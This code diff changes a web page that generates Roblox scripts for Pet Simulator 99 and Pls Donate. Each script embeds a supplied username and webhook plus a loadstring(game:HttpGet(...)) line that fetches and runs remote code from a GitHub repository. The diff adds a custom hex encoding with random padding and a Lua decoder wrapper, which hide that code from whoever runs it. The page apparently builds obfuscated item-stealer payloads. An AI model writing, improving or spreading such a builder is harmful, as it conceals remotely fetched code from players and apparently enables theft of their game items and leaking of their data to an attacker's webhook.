@@ -61,7 +61,7 @@
             <option value="Pet Simulator 99">Pet Simulator 99</option>
             <option value="Pls Donate">Pls Donate</option>
         </select>
-        <label><input type="checkbox" id="auto-obfuscate-option"> Auto Obfuscate 5x</label>
+        <label><input type="checkbox" id="auto-obfuscate-option"> Advanced Hex Obfuscate</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
     <script>
@@ -72,19 +72,27 @@
             "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };function hexEncode(script) {
-        return script.split('').map(char => "\\x" + char.charCodeAt(0).toString(16)).join('');
+        return script.split('').map((c, i) => {
+            let hex = c.charCodeAt(0).toString(16);
+            let rand = Math.floor(Math.random() * 9);
+            return `\z${hex}${rand}`; // Custom separator with random digits
+        }).join('');
     }
 
-    function multiHexObfuscate(script, times) {
-        let result = script;
-        for (let i = 0; i < times; i++) {
-            result = hexEncode(result);
-        }
-        return result;
+    function wrapInDecoder(hexString) {
+        return `loadstring((function()
+            local hex = '${hexString}'
+            local decoded = ''
+            for h in hex:gmatch('\\z(%x%x)%d') do
+                decoded = decoded .. string.char(tonumber(h, 16))
+            end
+            return decoded
+        end)())()`;
     }
 
     function obfuscateScript(script) {
-        return `return(function(...) local P={'${multiHexObfuscate(script, 5)}'} for i=1,#P do P[i]=string.char(P[i]:match("\\x(%x%x)")) end loadstring(table.concat(P))(...) end)(...)`;
+        let hex = hexEncode(script);
+        return wrapInDecoder(hex);
     }
 
     function generateScript() {
@@ -99,7 +107,8 @@
         }
 
         let script = `Username = "${username}"
-Webhook = "${webhook}" 
+
+Webhook = "${webhook}"
 ${loadstrings[selectedScript]}`;
 
 if (autoObfuscate) {
@@ -113,7 +122,7 @@ if (autoObfuscate) {
         let blob = new Blob([content], { type: "text/plain" });
         let a = document.createElement("a");
         a.href = URL.createObjectURL(blob);
-        a.download = "voidscript.txt";
+        a.download = "generated_script.txt";
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
